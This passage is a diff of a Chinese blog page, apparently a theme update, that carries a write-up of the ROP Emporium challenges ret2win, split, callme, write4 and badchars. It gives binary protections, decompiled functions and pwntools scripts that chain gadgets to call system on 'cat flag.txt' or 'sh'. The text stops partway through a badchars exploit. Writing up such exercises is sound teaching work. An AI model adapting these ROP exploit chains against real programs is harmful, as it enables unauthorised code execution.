@@ -1,37 +1,52 @@
+
+
 <!DOCTYPE html>
-<html lang="zh-CN">
-
-
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
 
 
 
 <head><meta name="generator" content="Hexo 3.9.0">
   <meta charset="UTF-8">
-  <link rel="apple-touch-icon" sizes="76x76" href="/img/apple-touch-icon.png">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
   <link rel="icon" type="image/png" href="/img/favicon.png">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
   <meta http-equiv="x-ua-compatible" content="ie=edge">
   
+  <meta name="theme-color" content="#2f4154">
   <meta name="description" content>
   <meta name="author" content="chumen77">
   <meta name="keywords" content>
-  <title>Ropemporium 通关记录 ~ Chumen77&#39;s Blog</title>
+  <title>Ropemporium 通关记录 - Chumen77&#39;s Blog</title>
 
-  <link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
-<link rel="stylesheet" href="/lib/bootstrap/css/bootstrap.min.css">
-<link rel="stylesheet" href="/lib/mdbootstrap/css/mdb.min.css">
-<link rel="stylesheet" href="/lib/github-markdown/github-markdown.min.css">
-<link rel="stylesheet" href="//at.alicdn.com/t/font_1067060_qzomjdt8bmp.css">
+  <link rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css">
 
 
-  <link rel="stylesheet" href="/lib/prettify/tomorrow-night-eighties.min.css">
+  <link rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css">
+  <link rel="stylesheet" href="/lib/hint/hint.min.css">
+
+  
+    
+    
+      
+      <link rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.0.0/styles/apache-config.min.css">
+    
+  
+
+  
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
 
 <link rel="stylesheet" href="/css/main.css">
 
+<!-- 自定义样式保持在最底部 -->
 
-  <link rel="stylesheet" href="/lib/fancybox/jquery.fancybox.min.css">
 
-
+  <script src="/js/utils.js"></script>
+  <script src="/js/color-schema.js"></script>
 </head>
 
 
@@ -56,40 +71,60 @@
           
           
           
-          <li class="nav-item">
-            <a class="nav-link" href="/">首页</a>
-          </li>
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
         
           
           
           
           
-          <li class="nav-item">
-            <a class="nav-link" href="/archives/">归档</a>
-          </li>
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
         
           
           
           
           
-          <li class="nav-item">
-            <a class="nav-link" href="/tags/">标签</a>
-          </li>
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
         
           
           
           
           
-          <li class="nav-item">
-            <a class="nav-link" href="/about/">关于</a>
-          </li>
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
         
-          
-          
         
           <li class="nav-item" id="search-btn">
-            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;&nbsp;<i
-                class="iconfont icon-search"></i>&nbsp;&nbsp;</a>
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
           </li>
         
       </ul>
@@ -97,51 +132,53 @@
   </div>
 </nav>
 
-    <div class="view intro-2" id="background" false
-         style="background: url('/img/default.png')no-repeat center center;
+    <div class="banner intro-2" id="background" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
            background-size: cover;">
       <div class="full-bg-img">
-        <div class="mask rgba-black-light flex-center">
-          <div class="container text-center white-text fadeInUp">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="container page-header text-center fade-in-up">
             <span class="h2" id="subtitle">
               
             </span>
 
             
-              <br>
-              
-                <p class="mt-3">
-                  <i class="fas fa-calendar-alt" aria-hidden="true"></i>&nbsp;
-                  星期一, 四月 13日 2020, 12:32 下午
-                </p>
-              
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2020-04-13 12:32" pubdate>
+        2020年4月13日 下午
+      </time>
+    </span>
+  
+</div>
 
-              <p>
-                
-                  
-                  &nbsp;<i class="far fa-chart-bar"></i>
-                  <span class="post-count">
-                    2.9k 字
-                  </span>&nbsp;
-                
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      2.6k 字
+    </span>
+  
 
-                
-                  
-                  &nbsp;<i class="far fa-clock"></i>
-                  <span class="post-count">
-                      14 分钟
-                  </span>&nbsp;
-                
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      40
+       分钟
+    </span>
+  
 
-                
-                  <!-- 不蒜子统计文章PV -->
-                  
-                  &nbsp;<i class="far fa-eye" aria-hidden="true"></i>&nbsp;
-                  <span id="busuanzi_container_page_pv">
-                    <span id="busuanzi_value_page_pv"></span> 次
-                  </span>&nbsp;
-                
-              </p>
+  
+  
+</div>
+
             
           </div>
 
@@ -159,219 +196,248 @@
   <div class="row">
     <div class="d-none d-lg-block col-lg-2"></div>
     <div class="col-lg-8 nopadding-md">
-      <div class="py-5 z-depth-3" id="board">
-        <div class="post-content mx-auto" id="post">
-          <div class="markdown-body">
-            <h1 id="Ropemporium-通关记录"><a href="#Ropemporium-通关记录" class="headerlink" title="Ropemporium 通关记录"></a>Ropemporium 通关记录</h1><h2 id="ret2win"><a href="#ret2win" class="headerlink" title="ret2win"></a>ret2win</h2><h3 id="保护和arch"><a href="#保护和arch" class="headerlink" title="保护和arch"></a>保护和arch</h3><pre><code>    Arch:     amd64-64-little
-    RELRO:    Partial RELRO
-    Stack:    No canary found
-    NX:       NX enabled
-    PIE:      No PIE (0x400000)</code></pre><h3 id="ida分析"><a href="#ida分析" class="headerlink" title="ida分析"></a>ida分析</h3><p>题目给了提示，32的buf却可以填充50个字节。并且接受用的是fgets，这个函数不用担心空字节。</p>
-<pre><code class="c">int ret2win()
-{
-  printf(&quot;Thank you! Here&#39;s your flag:&quot;);
-  return system(&quot;/bin/cat flag.txt&quot;);
-}</code></pre>
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto" id="post">
+            <!-- SEO header -->
+            <h1 style="display: none">Ropemporium 通关记录</h1>
+            
+            <div class="markdown-body" id="post-body">
+              <h1 id="Ropemporium-通关记录"><a href="#Ropemporium-通关记录" class="headerlink" title="Ropemporium 通关记录"></a>Ropemporium 通关记录</h1><h2 id="ret2win"><a href="#ret2win" class="headerlink" title="ret2win"></a>ret2win</h2><h3 id="保护和arch"><a href="#保护和arch" class="headerlink" title="保护和arch"></a>保护和arch</h3><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-attr">Arch:</span>     <span class="hljs-string">amd64-64-little</span>
+<span class="hljs-attr">RELRO:</span>    <span class="hljs-string">Partial</span> <span class="hljs-string">RELRO</span>
+<span class="hljs-attr">Stack:</span>    <span class="hljs-literal">No</span> <span class="hljs-string">canary</span> <span class="hljs-string">found</span>
+<span class="hljs-attr">NX:</span>       <span class="hljs-string">NX</span> <span class="hljs-string">enabled</span>
+<span class="hljs-attr">PIE:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x400000)</span></code></pre></div>
+
+<h3 id="ida分析"><a href="#ida分析" class="headerlink" title="ida分析"></a>ida分析</h3><p>题目给了提示，32的buf却可以填充50个字节。并且接受用的是fgets，这个函数不用担心空字节。</p>
+<div class="hljs"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">ret2win</span><span class="hljs-params">()</span>
+</span>&#123;
+  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Thank you! Here's your flag:"</span>);
+  <span class="hljs-keyword">return</span> system(<span class="hljs-string">"/bin/cat flag.txt"</span>);
+&#125;</code></pre></div>
+
 <p>并且存在漏洞函数。</p>
-<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><h4 id="32位"><a href="#32位" class="headerlink" title="32位"></a>32位</h4><pre><code class="python">from pwn import *
-context.arch = &#39;i386&#39;
-io = process(&#39;./ret2win32&#39;)
-io.recvuntil(&#39;&gt;&#39;)
-payload = &#39;a&#39; * 44 + p32(0x08048659)
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><h4 id="32位"><a href="#32位" class="headerlink" title="32位"></a>32位</h4><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+context.arch = <span class="hljs-string">'i386'</span>
+io = process(<span class="hljs-string">'./ret2win32'</span>)
+io.recvuntil(<span class="hljs-string">'&gt;'</span>)
+payload = <span class="hljs-string">'a'</span> * <span class="hljs-number">44</span> + p32(<span class="hljs-number">0x08048659</span>)
 io.sendline(payload)
-io.interactive()</code></pre>
-<h4 id="64位"><a href="#64位" class="headerlink" title="64位"></a>64位</h4><pre><code class="python">from pwn import *
-context.arch = &#39;amd64&#39;
-io = process(&#39;./ret2win&#39;)
-io.recvuntil(&#39;&gt;&#39;)
-payload = &#39;a&#39; * 40 + p64(0x00000400811)
+io.interactive()</code></pre></div>
+
+<h4 id="64位"><a href="#64位" class="headerlink" title="64位"></a>64位</h4><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+context.arch = <span class="hljs-string">'amd64'</span>
+io = process(<span class="hljs-string">'./ret2win'</span>)
+io.recvuntil(<span class="hljs-string">'&gt;'</span>)
+payload = <span class="hljs-string">'a'</span> * <span class="hljs-number">40</span> + p64(<span class="hljs-number">0x00000400811</span>)
 io.sendline(payload)
-io.interactive()</code></pre>
-<h2 id="split"><a href="#split" class="headerlink" title="split"></a>split</h2><h3 id="保护和arch-1"><a href="#保护和arch-1" class="headerlink" title="保护和arch"></a>保护和arch</h3><pre><code>    Arch:     amd64-64-little
-    RELRO:    Partial RELRO
-    Stack:    No canary found
-    NX:       NX enabled
-    PIE:      No PIE (0x400000)</code></pre><h3 id="ida分析-1"><a href="#ida分析-1" class="headerlink" title="ida分析"></a>ida分析</h3><pre><code class="c">int usefulFunction()
-{
-  return system(&quot;/bin/ls&quot;);
-}</code></pre>
+io.interactive()</code></pre></div>
+
+<h2 id="split"><a href="#split" class="headerlink" title="split"></a>split</h2><h3 id="保护和arch-1"><a href="#保护和arch-1" class="headerlink" title="保护和arch"></a>保护和arch</h3><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-attr">Arch:</span>     <span class="hljs-string">amd64-64-little</span>
+<span class="hljs-attr">RELRO:</span>    <span class="hljs-string">Partial</span> <span class="hljs-string">RELRO</span>
+<span class="hljs-attr">Stack:</span>    <span class="hljs-literal">No</span> <span class="hljs-string">canary</span> <span class="hljs-string">found</span>
+<span class="hljs-attr">NX:</span>       <span class="hljs-string">NX</span> <span class="hljs-string">enabled</span>
+<span class="hljs-attr">PIE:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x400000)</span></code></pre></div>
+
+<h3 id="ida分析-1"><a href="#ida分析-1" class="headerlink" title="ida分析"></a>ida分析</h3><div class="hljs"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">usefulFunction</span><span class="hljs-params">()</span>
+</span>&#123;
+  <span class="hljs-keyword">return</span> system(<span class="hljs-string">"/bin/ls"</span>);
+&#125;</code></pre></div>
+
 <p>后门函数变成了这样，但是可以看到有cat flag的字符串。这样只需要控制system的参数即可。<br><img src="http://qiqianyun.chumen77.xyz/uPic/aPvOxL.png" srcset="/img/loading.gif" alt><br><img src="http://qiqianyun.chumen77.xyz/uPic/qQOFlI.png" srcset="/img/loading.gif" alt></p>
-<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><h4 id="32位："><a href="#32位：" class="headerlink" title="32位："></a>32位：</h4><pre><code class="python">from pwn import *
-context.arch = &#39;i386&#39;
-io = process(&#39;./split32&#39;)
-key = 0x0804A030 # /bin/cat flag.txt&#39;
-io.recvuntil(&#39;&gt;&#39;)
-offset = 44
-payload = &#39;a&#39; * offset + p32(0x08048657) + p32(0x0804A030)
-raw_input(&#39;-&gt;&#39;)
+<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><h4 id="32位："><a href="#32位：" class="headerlink" title="32位："></a>32位：</h4><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+context.arch = <span class="hljs-string">'i386'</span>
+io = process(<span class="hljs-string">'./split32'</span>)
+key = <span class="hljs-number">0x0804A030</span> <span class="hljs-comment"># /bin/cat flag.txt'</span>
+io.recvuntil(<span class="hljs-string">'&gt;'</span>)
+offset = <span class="hljs-number">44</span>
+payload = <span class="hljs-string">'a'</span> * offset + p32(<span class="hljs-number">0x08048657</span>) + p32(<span class="hljs-number">0x0804A030</span>)
+raw_input(<span class="hljs-string">'-&gt;'</span>)
 io.sendline(payload)
-io.interactive()</code></pre>
-<h4 id="64位："><a href="#64位：" class="headerlink" title="64位："></a>64位：</h4><pre><code class="python">from pwn import *
-context.arch = &#39;amd64&#39;
-io = process(&#39;./split&#39;)
-io.recvuntil(&#39;&gt;&#39;)
-key = 0x00601060 # /bin/cat flag.txt&#39;
-offset = 40
-pop_rdi_ret = 0x0000000000400883
-payload = &#39;a&#39; * offset + p64(pop_rdi_ret) + p64(key) + p64(0x00000400810) 
+io.interactive()</code></pre></div>
+
+<h4 id="64位："><a href="#64位：" class="headerlink" title="64位："></a>64位：</h4><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+context.arch = <span class="hljs-string">'amd64'</span>
+io = process(<span class="hljs-string">'./split'</span>)
+io.recvuntil(<span class="hljs-string">'&gt;'</span>)
+key = <span class="hljs-number">0x00601060</span> <span class="hljs-comment"># /bin/cat flag.txt'</span>
+offset = <span class="hljs-number">40</span>
+pop_rdi_ret = <span class="hljs-number">0x0000000000400883</span>
+payload = <span class="hljs-string">'a'</span> * offset + p64(pop_rdi_ret) + p64(key) + p64(<span class="hljs-number">0x00000400810</span>) 
 io.sendline(payload)
-io.interactive()</code></pre>
-<h2 id="callme"><a href="#callme" class="headerlink" title="callme"></a>callme</h2><h3 id="ida分析-2"><a href="#ida分析-2" class="headerlink" title="ida分析"></a>ida分析</h3><pre><code class="c">void __noreturn usefulFunction()
-{
-  callme_three(4LL, 5LL, 6LL);
-  callme_two(4LL, 5LL, 6LL);
-  callme_one(4LL, 5LL, 6LL);
-  exit(1);
-}</code></pre>
+io.interactive()</code></pre></div>
+
+<h2 id="callme"><a href="#callme" class="headerlink" title="callme"></a>callme</h2><h3 id="ida分析-2"><a href="#ida分析-2" class="headerlink" title="ida分析"></a>ida分析</h3><div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">void</span> __<span class="hljs-function">noreturn <span class="hljs-title">usefulFunction</span><span class="hljs-params">()</span>
+</span>&#123;
+  callme_three(<span class="hljs-number">4L</span>L, <span class="hljs-number">5L</span>L, <span class="hljs-number">6L</span>L);
+  callme_two(<span class="hljs-number">4L</span>L, <span class="hljs-number">5L</span>L, <span class="hljs-number">6L</span>L);
+  callme_one(<span class="hljs-number">4L</span>L, <span class="hljs-number">5L</span>L, <span class="hljs-number">6L</span>L);
+  <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);
+&#125;</code></pre></div>
+
 <p>这个是关键函数，但是其是用到了给的so文件，然后ida来分析so文件。</p>
 <p><img src="http://qiqianyun.chumen77.xyz/uPic/FgKhVy.png" srcset="/img/loading.gif" alt><br>找到以后发现应该是按照顺序调用<code>callme-one，callme-two，callme-three</code>需要注意其参数都要是1，2，3.当初程序中给的是4，5，6 需要想办法来换掉这个参数。</p>
-<h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><h4 id="32位：-1"><a href="#32位：-1" class="headerlink" title="32位："></a>32位：</h4><pre><code class="python">from pwn import *
-context.arch = &#39;i386&#39;
-io = process(&#39;./callme32&#39;)
-io.recvuntil(&#39;&gt;&#39;)
-offset = 44
-callme_one = 0x080485C0
-callme_two = 0x08048620
-callme_three = 0x080485B0
-pop3_ret = 0x080488a9
-payload = &#39;a&#39; * offset + p32(callme_one) + p32(pop3_ret) + p32(1) + p32(2) + p32(3)
-payload += p32(callme_two) + p32(pop3_ret) + p32(1) + p32(2) + p32(3)
-payload += p32(callme_three) + p32(0xdeadbeef) + p32(1) + p32(2) + p32(3)
-raw_input(&#39;-&gt;&#39;)
+<h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><h4 id="32位：-1"><a href="#32位：-1" class="headerlink" title="32位："></a>32位：</h4><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+context.arch = <span class="hljs-string">'i386'</span>
+io = process(<span class="hljs-string">'./callme32'</span>)
+io.recvuntil(<span class="hljs-string">'&gt;'</span>)
+offset = <span class="hljs-number">44</span>
+callme_one = <span class="hljs-number">0x080485C0</span>
+callme_two = <span class="hljs-number">0x08048620</span>
+callme_three = <span class="hljs-number">0x080485B0</span>
+pop3_ret = <span class="hljs-number">0x080488a9</span>
+payload = <span class="hljs-string">'a'</span> * offset + p32(callme_one) + p32(pop3_ret) + p32(<span class="hljs-number">1</span>) + p32(<span class="hljs-number">2</span>) + p32(<span class="hljs-number">3</span>)
+payload += p32(callme_two) + p32(pop3_ret) + p32(<span class="hljs-number">1</span>) + p32(<span class="hljs-number">2</span>) + p32(<span class="hljs-number">3</span>)
+payload += p32(callme_three) + p32(<span class="hljs-number">0xdeadbeef</span>) + p32(<span class="hljs-number">1</span>) + p32(<span class="hljs-number">2</span>) + p32(<span class="hljs-number">3</span>)
+raw_input(<span class="hljs-string">'-&gt;'</span>)
 io.sendline(payload)
-io.interactive()</code></pre>
+io.interactive()</code></pre></div>
+
 <p>其中<code>pop3_ret</code> 是用来保持栈平衡的，且站的位置函数的返回地址。还有需要注意的问题是：<br><img src="http://qiqianyun.chumen77.xyz/uPic/9PV8oL.png" srcset="/img/loading.gif" alt><br>注意填充以后的返回地址填的时候，通常填的是代码段的数据，但是这里汇编是<code>call</code>所以在填的时候，应该是填充其plt的地址。<br><img src="http://qiqianyun.chumen77.xyz/uPic/HxXaWe.png" srcset="/img/loading.gif" alt></p>
-<h4 id="64位：-1"><a href="#64位：-1" class="headerlink" title="64位："></a>64位：</h4><pre><code class="python">from pwn import *
-context.arch = &#39;amd64&#39;
-io = process(&#39;./callme&#39;)
-io.recvuntil(&#39;&gt;&#39;)
-offset = 40
-callme_one = 0x00401850
-callme_two = 0x000401870
-callme_three = 0x00401810
-pop3_ret = 0x0000000000401ab0
-payload = &#39;a&#39; * offset + p64(pop3_ret) + p64(1) + p64(2) + p64(3) + p64(callme_one)
-payload += p64(pop3_ret) + p64(1) + p64(2) + p64(3) + p64(callme_two)
-payload += p64(pop3_ret) + p64(1) + p64(2) + p64(3) + p64(callme_three)
-raw_input(&#39;-&gt;&#39;)
+<h4 id="64位：-1"><a href="#64位：-1" class="headerlink" title="64位："></a>64位：</h4><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+context.arch = <span class="hljs-string">'amd64'</span>
+io = process(<span class="hljs-string">'./callme'</span>)
+io.recvuntil(<span class="hljs-string">'&gt;'</span>)
+offset = <span class="hljs-number">40</span>
+callme_one = <span class="hljs-number">0x00401850</span>
+callme_two = <span class="hljs-number">0x000401870</span>
+callme_three = <span class="hljs-number">0x00401810</span>
+pop3_ret = <span class="hljs-number">0x0000000000401ab0</span>
+payload = <span class="hljs-string">'a'</span> * offset + p64(pop3_ret) + p64(<span class="hljs-number">1</span>) + p64(<span class="hljs-number">2</span>) + p64(<span class="hljs-number">3</span>) + p64(callme_one)
+payload += p64(pop3_ret) + p64(<span class="hljs-number">1</span>) + p64(<span class="hljs-number">2</span>) + p64(<span class="hljs-number">3</span>) + p64(callme_two)
+payload += p64(pop3_ret) + p64(<span class="hljs-number">1</span>) + p64(<span class="hljs-number">2</span>) + p64(<span class="hljs-number">3</span>) + p64(callme_three)
+raw_input(<span class="hljs-string">'-&gt;'</span>)
 io.sendline(payload)
-io.interactive()</code></pre>
+io.interactive()</code></pre></div>
+
 <p>利用 <code>0x0000000000401ab0 : pop rdi ; pop rsi ; pop rdx ; ret</code>这个gadget来控制参数。</p>
 <h2 id="write4"><a href="#write4" class="headerlink" title="write4"></a>write4</h2><h3 id="ida分析-3"><a href="#ida分析-3" class="headerlink" title="ida分析"></a>ida分析</h3><p>这个题跟前面第2题很像，但是就是没有给你<code>cat flag</code> 的字符串了。需要自己用程序的gadget来构造。思路也就是进行rop把<code>/bin/sh</code>往bss段上写,然后接着拿shell就好了。</p>
-<pre><code>ROPgadget --binary ./write4 --only &quot;mov|pop|ret&quot;</code></pre><p><strong>查好用的gadgets：</strong><br><img src="http://qiqianyun.chumen77.xyz/uPic/pY6tBk.png" srcset="/img/loading.gif" alt><br>利用这即可就可以了，32位的类似。</p>
-<h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><h4 id="32位：-2"><a href="#32位：-2" class="headerlink" title="32位："></a>32位：</h4><pre><code class="python">from pwn import *
-context.arch = &#39;i386&#39;
-io = process(&#39;./write432&#39;)
-io.recvuntil(&#39;&gt;&#39;)
-elf = ELF(&#39;./write432&#39;)
-# bin_sh = elf.search(&#39;/bin/cat&#39;).next()
-offset = 44
-bss = 0x804A06C-0x10
-pop_edi_pop_ebp_ret = 0x080486da
-system = 0x8048430
-key = 0x08048670 #mov dword ptr [edi], ebp ; ret
-payload = &#39;a&#39; * offset + flat([pop_edi_pop_ebp_ret,bss,&#39;sh\x00\x00&#39;,key,system,0xdeadbeef,bss])
-raw_input(&#39;-&gt;&#39;)
+<div class="hljs"><pre><code class="hljs undefined">ROPgadget <span class="hljs-params">--binary</span> <span class="hljs-string">./write4</span> <span class="hljs-params">--only</span> <span class="hljs-string">"mov|pop|ret"</span></code></pre></div>
+
+<p><strong>查好用的gadgets：</strong><br><img src="http://qiqianyun.chumen77.xyz/uPic/pY6tBk.png" srcset="/img/loading.gif" alt><br>利用这即可就可以了，32位的类似。</p>
+<h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><h4 id="32位：-2"><a href="#32位：-2" class="headerlink" title="32位："></a>32位：</h4><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+context.arch = <span class="hljs-string">'i386'</span>
+io = process(<span class="hljs-string">'./write432'</span>)
+io.recvuntil(<span class="hljs-string">'&gt;'</span>)
+elf = ELF(<span class="hljs-string">'./write432'</span>)
+<span class="hljs-comment"># bin_sh = elf.search('/bin/cat').next()</span>
+offset = <span class="hljs-number">44</span>
+bss = <span class="hljs-number">0x804A06C</span><span class="hljs-number">-0x10</span>
+pop_edi_pop_ebp_ret = <span class="hljs-number">0x080486da</span>
+system = <span class="hljs-number">0x8048430</span>
+key = <span class="hljs-number">0x08048670</span> <span class="hljs-comment">#mov dword ptr [edi], ebp ; ret</span>
+payload = <span class="hljs-string">'a'</span> * offset + flat([pop_edi_pop_ebp_ret,bss,<span class="hljs-string">'sh\x00\x00'</span>,key,system,<span class="hljs-number">0xdeadbeef</span>,bss])
+raw_input(<span class="hljs-string">'-&gt;'</span>)
 io.sendline(payload)
-io.interactive()</code></pre>
-<h4 id="64位：-2"><a href="#64位：-2" class="headerlink" title="64位："></a>64位：</h4><pre><code class="python">from pwn import *
-context.arch = &#39;amd64&#39;
-io = process(&#39;./write4&#39;)
-io.recvuntil(&#39;&gt;&#39;)
-elf = ELF(&#39;./write4&#39;)
-# bin_sh = elf.search(&#39;/bin/cat&#39;).next()
-offset = 40
-bss = 0x601090-0x10
-key1 = 0x0000000000400820# mov qword ptr [r14], r15 ; ret
-key2 = 0x0000000000400890# pop r14 ; pop r15 ; ret
-key3 = 0x0000000000400893#pop rdi ; ret
-system = 0x000004005E0
-payload = &#39;a&#39; * offset + flat([key2,bss,&#39;/bin/sh\x00&#39;,key1,key3,bss,system])
-raw_input(&#39;-&gt;&#39;)
+io.interactive()</code></pre></div>
+
+<h4 id="64位：-2"><a href="#64位：-2" class="headerlink" title="64位："></a>64位：</h4><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+context.arch = <span class="hljs-string">'amd64'</span>
+io = process(<span class="hljs-string">'./write4'</span>)
+io.recvuntil(<span class="hljs-string">'&gt;'</span>)
+elf = ELF(<span class="hljs-string">'./write4'</span>)
+<span class="hljs-comment"># bin_sh = elf.search('/bin/cat').next()</span>
+offset = <span class="hljs-number">40</span>
+bss = <span class="hljs-number">0x601090</span><span class="hljs-number">-0x10</span>
+key1 = <span class="hljs-number">0x0000000000400820</span><span class="hljs-comment"># mov qword ptr [r14], r15 ; ret</span>
+key2 = <span class="hljs-number">0x0000000000400890</span><span class="hljs-comment"># pop r14 ; pop r15 ; ret</span>
+key3 = <span class="hljs-number">0x0000000000400893</span><span class="hljs-comment">#pop rdi ; ret</span>
+system = <span class="hljs-number">0x000004005E0</span>
+payload = <span class="hljs-string">'a'</span> * offset + flat([key2,bss,<span class="hljs-string">'/bin/sh\x00'</span>,key1,key3,bss,system])
+raw_input(<span class="hljs-string">'-&gt;'</span>)
 io.sendline(payload)
-io.interactive()</code></pre>
+io.interactive()</code></pre></div>
+
 <h2 id="badchars"><a href="#badchars" class="headerlink" title="badchars"></a>badchars</h2><h3 id="ida分析-4"><a href="#ida分析-4" class="headerlink" title="ida分析"></a>ida分析</h3><p>这个题目跟前一个write4十分的相似，但是其过滤了个别字符：<br><img src="http://qiqianyun.chumen77.xyz/uPic/C2HXoN.png" srcset="/img/loading.gif" alt><br>会将其替换为<code>0xEB</code>，个人解决办法就是在bss段写好被程序处理过的字符串后，在用xor的gadgets来重新改回来，为了便于利用，32位和64位都是构造<code>system(sh)</code>来拿的shell。<br>例子：<br><img src="http://qiqianyun.chumen77.xyz/uPic/4tnNv7.png" srcset="/img/loading.gif" alt><br>传过去的是<code>sh\x00\x00\x00\x00\x00\x00\x00</code> 到bss是这个情况，然后去找xor的gadget：<br><img src="http://qiqianyun.chumen77.xyz/uPic/4OvcwS.png" srcset="/img/loading.gif" alt><br>其中注意这是以一个byte来进行xor的，然后这个图xor的倒数第一条语句，**其中的是dh，这个是edx的高位。r14b是r14的低位也是一个byte的字节单位。<br>这个题目在gdb调试exp时会发现有比较便捷的办法。</p>
-<h3 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h3><h4 id="32位：-3"><a href="#32位：-3" class="headerlink" title="32位："></a>32位：</h4><pre><code class="python">from pwn import *
-context.arch = &#39;i386&#39;
-io = process(&#39;./badchars32&#39;)
-io.recvuntil(&#39;&gt;&#39;)
-elf = ELF(&#39;./badchars32&#39;)
-key1 = 0x08048893# mov dword ptr [edi], esi ; ret
-key2 = 0x08048899# pop esi ; pop edi ; ret
-key3 = 0x08048461# pop ebx ; ret
-bss = 0x804A06C-10
-key4 = 0x08048897# pop ecx ; ret
-key5 = 0x08048890#xor byte ptr [ebx], cl ; ret
-sys = 0x080484E0
-offset = 44
-payload = &#39;a&#39; * offset + flat([key2,&#39;sh\x00\x00&#39;,bss,key1,key3,bss,key4,0x98,key5,sys,0xdeadbeef,bss])
-raw_input(&quot;-&gt;&quot;)
+<h3 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h3><h4 id="32位：-3"><a href="#32位：-3" class="headerlink" title="32位："></a>32位：</h4><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+context.arch = <span class="hljs-string">'i386'</span>
+io = process(<span class="hljs-string">'./badchars32'</span>)
+io.recvuntil(<span class="hljs-string">'&gt;'</span>)
+elf = ELF(<span class="hljs-string">'./badchars32'</span>)
+key1 = <span class="hljs-number">0x08048893</span><span class="hljs-comment"># mov dword ptr [edi], esi ; ret</span>
+key2 = <span class="hljs-number">0x08048899</span><span class="hljs-comment"># pop esi ; pop edi ; ret</span>
+key3 = <span class="hljs-number">0x08048461</span><span class="hljs-comment"># pop ebx ; ret</span>
+bss = <span class="hljs-number">0x804A06C</span><span class="hljs-number">-10</span>
+key4 = <span class="hljs-number">0x08048897</span><span class="hljs-comment"># pop ecx ; ret</span>
+key5 = <span class="hljs-number">0x08048890</span><span class="hljs-comment">#xor byte ptr [ebx], cl ; ret</span>
+sys = <span class="hljs-number">0x080484E0</span>
+offset = <span class="hljs-number">44</span>
